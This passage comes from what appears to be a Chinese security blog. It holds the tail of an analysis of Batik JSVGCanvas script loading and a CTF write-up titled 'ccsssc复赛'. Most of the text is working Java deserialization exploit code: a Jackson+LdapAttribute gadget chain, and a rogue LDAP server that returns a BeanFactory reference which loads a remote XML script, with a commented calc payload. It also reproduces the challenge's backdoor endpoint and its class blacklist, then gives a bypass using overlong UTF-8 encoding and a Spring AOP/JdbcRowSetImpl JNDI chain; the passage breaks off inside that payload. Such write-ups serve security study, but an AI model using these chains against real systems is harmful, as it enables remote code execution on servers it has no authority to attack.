class="line">            return;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        Manifest man = new Manifest(url.openStream());  </span><br><span class="line">        this.executedScripts.put(script, (Object)null);  </span><br><span class="line">        mediaType = man.getMainAttributes().getValue(&quot;Script-Handler&quot;);  </span><br><span class="line">        if (mediaType != null) &#123;  </span><br><span class="line">            ScriptHandler h = (ScriptHandler)cll.loadClass(mediaType).getDeclaredConstructor().newInstance();  </span><br><span class="line">            h.run(this.document, this.getWindow());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        mediaType = man.getMainAttributes().getValue(&quot;SVG-Handler-Class&quot;);  </span><br><span class="line">        if (mediaType != null) &#123;  </span><br><span class="line">            EventListenerInitializer initializer = (EventListenerInitializer)cll.loadClass(mediaType).getDeclaredConstructor().newInstance();  </span><br><span class="line">            this.getWindow();  </span><br><span class="line">            initializer.initializeEventListeners((SVGDocument)this.document);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; catch (Exception var16) &#123;  </span><br><span class="line">        Exception e = var16;  </span><br><span class="line">        if (this.userAgent != null) &#123;  </span><br><span class="line">            this.userAgent.displayError(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就解释了xml文件为什么这样构造.参考上面的内容,可以看出我们在构造jar包的时候可以有两种构造方式,一种是继承自<code>ScriptHandler</code>,并重写<code>run</code>方法,一种是继承自<code>EventListenerInitializer</code>,并重写<code>initializeEventListeners</code>方法.上面的示例显然是使用的第二种构造.</p><h3 id="一些其他的问题"><a href="#一些其他的问题" class="headerlink" title="一些其他的问题"></a>一些其他的问题</h3><p><a href="https://gsbp0.github.io/post/jdk17%E6%89%93jackson+ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">看到了一个师傅的博客</a>,说是可以打Jackson+LdapAttribute反序列化,但是项目中没有相关的ldapserver,这位师傅也没给出,需要自己写一个.利用链如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtMethod;</span><br><span class="line">import javassist.LoaderClassPath;</span><br><span class="line"></span><br><span class="line">import javax.naming.directory.Attribute;</span><br><span class="line">import javax.naming.CompositeName;</span><br><span class="line">import javax.swing.event.EventListenerList;</span><br><span class="line">import javax.swing.undo.UndoManager;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Vector;</span><br><span class="line"></span><br><span class="line">public class LdapAttributeChain</span><br><span class="line">&#123;</span><br><span class="line">    public static void main( String[] args ) throws Exception &#123;</span><br><span class="line">        UnsafeUtil.patchModule(LdapAttributeChain.class);</span><br><span class="line">        UnsafeUtil.patchModule(ProxyUtil.class);</span><br><span class="line">        UnsafeUtil.patchModule(ReflectUtil.class);</span><br><span class="line">        UnsafeUtil.patchModule(SerializeUtil.class);</span><br><span class="line">        UnsafeUtil.patchModule(UnsafeUtil.class);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        String ldapCtxUrl = &quot;ldap://127.0.0.1:1389/&quot;;</span><br><span class="line">        Class ldapAttributeClazz = Class.forName(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);</span><br><span class="line">        Object ldapAttribute = UnsafeUtil.newInstance(ldapAttributeClazz, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;name&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        UnsafeUtil.setFieldValue(ldapAttribute,&quot;baseCtxURL&quot;,ldapCtxUrl);</span><br><span class="line">        UnsafeUtil.setFieldValue(ldapAttribute,&quot;rdn&quot;,new CompositeName(&quot;Exploit/&quot;));</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));</span><br><span class="line">        CtClass ctClass = classPool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class="line">        CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line"></span><br><span class="line">        Proxy proxy = (Proxy) ProxyUtil.getBProxy(ldapAttribute, new Class[]&#123;Attribute.class&#125;);</span><br><span class="line">        POJONode jsonNodes = new POJONode(proxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        EventListenerList exp = new EventListenerList();</span><br><span class="line">        UndoManager manager = new UndoManager();</span><br><span class="line">        Vector vector = (Vector) UnsafeUtil.getFieldValue(manager, &quot;edits&quot;);</span><br><span class="line">        vector.add(jsonNodes);</span><br><span class="line">        UnsafeUtil.setFieldValue(exp, &quot;listenerList&quot;, new Object[] &#123; InternalError.class, manager &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        byte[] bytes = SerializeUtil.serialize(exp);</span><br><span class="line">        SerializeUtil.deserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中构建并运行时VM的options为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/java.lang=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p>Server如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">package me.n1ar4;</span><br><span class="line"></span><br><span class="line">import com.unboundid.ldap.listener.*;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.*;</span><br><span class="line">import com.unboundid.ldap.sdk.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.util.TreeMap;</span><br><span class="line"></span><br><span class="line">// 接口</span><br><span class="line">interface LdapController &#123;</span><br><span class="line">    void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主类</span><br><span class="line">public class LdapServer extends InMemoryOperationInterceptor&#123;</span><br><span class="line"></span><br><span class="line">    TreeMap&lt;String, LdapController&gt; routes = new TreeMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            int port = 1389;</span><br><span class="line">            System.out.println(&quot;Starting LDAP server on 0.0.0.0:&quot; + port);</span><br><span class="line">            InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig(&quot;dc=example,dc=com&quot;);</span><br><span class="line">            serverConfig.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;, InetAddress.getByName(&quot;0.0.0.0&quot;), port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            serverConfig.addInMemoryOperationInterceptor(new LdapServer());</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(serverConfig);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public LdapServer() &#123;</span><br><span class="line">        routes.put(&quot;Exploit&quot;, new TomcatController());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void processSearchResult(InMemoryInterceptedSearchResult result) &#123;</span><br><span class="line">        String base = result.getRequest().getBaseDN();</span><br><span class="line">        for (String key : routes.keySet()) &#123;</span><br><span class="line">            if (key.equals(base) || (key.endsWith(&quot;*&quot;) &amp;&amp; base.startsWith(key.substring(0, key.length() - 1)))) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    routes.get(key).sendResult(result, base);</span><br><span class="line">                &#125; catch (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 控制器实现</span><br><span class="line">    class TomcatController implements LdapController &#123;</span><br><span class="line"></span><br><span class="line">        String payload = &quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception &#123;</span><br><span class="line">            System.out.println(&quot;Sending LDAP ResourceRef result for &quot; + base);</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;java.lang.String&quot;);</span><br><span class="line"></span><br><span class="line">//            ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">//                    true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">//            ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">//            ref.add(new StringRefAddr(&quot;x&quot;, payload));</span><br><span class="line">            ResourceRef ref = new ResourceRef(&quot;org.apache.batik.swing.JSVGCanvas&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">            ref.add(new StringRefAddr(&quot;URI&quot;, &quot;http://localhost:8886/1.xml&quot;));</span><br><span class="line">            e.addAttribute(&quot;javaSerializedData&quot;, SerializeUtil.serialize(ref));</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 简化版的脚本序列化工具</span><br><span class="line"></span><br><span class="line">        private String makeJavaScriptString(String input) &#123;</span><br><span class="line">            return input.replace(&quot;\\&quot;, &quot;\\\\&quot;).replace(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他还说yaml能打通,感觉版本确实,但是测试没有成功.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ccsssc复赛</title>
      <link href="/2025/04/21/ccsssc-fu-sai/index/"/>
      <url>/2025/04/21/ccsssc-fu-sai/index/</url>
      
        <content type="html"><![CDATA[<p>jdk11<br><img src="/images/Pasted%20image%2020250404151146.png"><br><code>backdoor.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ezjav.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.example.ezjav.utils.MyObjectInputStream;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class backdoor &#123;</span><br><span class="line">    static String banner = &quot;Welcome to java&quot;;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&#123;&quot;/&quot;&#125;)</span><br><span class="line">    public String index() throws Exception &#123;</span><br><span class="line">        return banner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&#123;&quot;/read&quot;&#125;)</span><br><span class="line">    public String read(@RequestBody String body) &#123;</span><br><span class="line">        if (body != null)</span><br><span class="line">            try &#123;</span><br><span class="line">                byte[] data = Base64.getDecoder().decode(body);</span><br><span class="line">                String temp = new String(data);</span><br><span class="line">                if (temp.contains(&quot;naming&quot;) || temp.contains(&quot;com.sun&quot;) || temp.contains(&quot;jdk.jfr&quot;))</span><br><span class="line">                    return &quot;banned&quot;;</span><br><span class="line">                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);</span><br><span class="line">                MyObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream);</span><br><span class="line">                Object object = objectInputStream.readObject();</span><br><span class="line">                return object.getClass().toString();</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                return e.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        return &quot;ok&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PalDataSource.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ezjav.utils;</span><br><span class="line"></span><br><span class="line">import com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line">import java.sql.SQLFeatureNotSupportedException;</span><br><span class="line">import java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line">public class PalDataSource extends DruidDataSource &#123;</span><br><span class="line">    public Connection getConnection(String username, String password) throws SQLException &#123;</span><br><span class="line">        return super.getConnection(username, password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>User.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ezjav.utils;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Comparator;</span><br><span class="line"></span><br><span class="line">public class User implements Serializable, Comparator &#123;</span><br><span class="line">    public String username;</span><br><span class="line"></span><br><span class="line">    public String password;</span><br><span class="line"></span><br><span class="line">    public Object compare;</span><br><span class="line"></span><br><span class="line">    public User(String user, String pass, String cmp) &#123;</span><br><span class="line">        this.username = user;</span><br><span class="line">        this.password = pass;</span><br><span class="line">        this.compare = cmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int compare(Object o1, Object o2) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Method m = this.compare.getClass().getDeclaredMethod(&quot;compare&quot;, new Class[] &#123; Object.class, Object.class &#125;);</span><br><span class="line">            m.setAccessible(true);</span><br><span class="line">            m.invoke(this.compare, new Object[] &#123; o1, o2 &#125;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MyObjectInputStream</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ezjav.utils;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.InvalidClassException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectStreamClass;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">public class MyObjectInputStream extends ObjectInputStream &#123;</span><br><span class="line">    private String[] denyClasses;</span><br><span class="line"></span><br><span class="line">    public MyObjectInputStream(ByteArrayInputStream var1) throws IOException &#123;</span><br><span class="line">        super(var1);</span><br><span class="line">        ArrayList&lt;String&gt; classList = new ArrayList&lt;&gt;();</span><br><span class="line">        InputStream file = com.example.ezjav.utils.MyObjectInputStream.class.getResourceAsStream(&quot;blacklist.txt&quot;);</span><br><span class="line">        BufferedReader var2 = new BufferedReader(new InputStreamReader(file));</span><br><span class="line">        String var4;</span><br><span class="line">        while ((var4 = var2.readLine()) != null)</span><br><span class="line">            classList.add(var4.trim());</span><br><span class="line">        this.denyClasses = new String[classList.size()];</span><br><span class="line">        classList.toArray(this.denyClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        String className = desc.getName();</span><br><span class="line">        int var5 = this.denyClasses.length;</span><br><span class="line">        for (int var6 = 0; var6 &lt; var5; var6++) &#123;</span><br><span class="line">            String denyClass = this.denyClasses[var6];</span><br><span class="line">            if (className.startsWith(denyClass))</span><br><span class="line">                throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, className);</span><br><span class="line">        &#125;</span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后来看一下黑名单<code>blacklist.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">javax.management.BadAttributeValueExpException</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString</span><br><span class="line">java.rmi.MarshalledObject</span><br><span class="line">java.rmi.activation.ActivationID</span><br><span class="line">javax.swing.event.EventListenerList</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">javax.swing.AbstractAction</span><br><span class="line">javax.swing.text.DefaultFormatter</span><br><span class="line">java.beans.EventHandler</span><br><span class="line">java.net.Inet4Address</span><br><span class="line">java.net.Inet6Address</span><br><span class="line">java.net.InetAddress</span><br><span class="line">java.net.InetSocketAddress</span><br><span class="line">java.net.Socket</span><br><span class="line">java.net.URL</span><br><span class="line">java.net.URLStreamHandler</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">java.rmi.registry.Registry</span><br><span class="line">java.rmi.RemoteObjectInvocationHandler</span><br><span class="line">java.rmi.server.ObjID</span><br><span class="line">java.lang.System</span><br><span class="line">javax.management.remote.JMXServiceUR</span><br><span class="line">javax.management.remote.rmi.RMIConnector</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">java.rmi.server.RemoteRef</span><br><span class="line">javax.swing.UIDefaults$TextAndMnemonicHashMap</span><br><span class="line">java.rmi.server.UnicastRemoteObject</span><br><span class="line">java.util.Base64</span><br><span class="line">java.util.Comparator</span><br><span class="line">java.util.HashMap</span><br><span class="line">java.util.logging.FileHandler</span><br><span class="line">java.security.SignedObject</span><br><span class="line">javax.swing.UIDefaults</span><br></pre></td></tr></table></figure><p>那么在看到这几个类,不考虑黑名单和依赖的情况下,首先关注到的就是在<code>User</code>类下的<code>Compare</code>方法.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public int compare(Object o1, Object o2) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Method m = this.compare.getClass().getDeclaredMethod(&quot;compare&quot;, new Class[] &#123; Object.class, Object.class &#125;);</span><br><span class="line">            m.setAccessible(true);</span><br><span class="line">            m.invoke(this.compare, new Object[] &#123; o1, o2 &#125;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然而仔细看了一下发现了问题,User类中的compare方法要求是String类型,并不是真正的可控.<br>然而这里给了我们启示,看到依赖中存在<code>spring-aop</code>和<code>aspectjweaver</code>,想到了新出的链子.对于直接解码进行的检测,可以直接使用<code>UTF8OverlongEncoding</code>去进行绕过.<br>对于除了<code>equals,hashcode</code>这两种方法,其他的都能触发<code>getAProxy</code>,打完整个利用链.<br>然而我们在尝试利用链的时候出现了报错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Can not set final java.util.Comparator field java.util.PriorityQueue.comparator to com.sun.proxy.$Proxy1</span><br><span class="line">at java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)</span><br><span class="line">at java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)</span><br><span class="line">at java.base/jdk.internal.reflect.UnsafeQualifiedObjectFieldAccessorImpl.set(UnsafeQualifiedObjectFieldAccessorImpl.java:83)</span><br><span class="line">at java.base/java.lang.reflect.Field.set(Field.java:780)</span><br><span class="line">at ReflectUtil.setFieldValue(ReflectUtil.java:33)</span><br><span class="line">at ReflectUtil.setFieldValue(ReflectUtil.java:25)</span><br><span class="line">at Main.main(Main.java:26)</span><br></pre></td></tr></table></figure><p>意思是不能将proxy1赋值给一个<code>Comparator</code>对象,那么我们就需要去给他套一个<code>Comparator</code>接口.<br>TemplatesImpl被禁用了,这里我们选择<code>JdbcRowSetImpl</code>来打一个jndi注入.得到payload如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line">import org.aopalliance.aop.Advice;</span><br><span class="line">import org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line">import org.springframework.aop.aspectj.AspectJExpressionPointcut;</span><br><span class="line">import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();</span><br><span class="line">        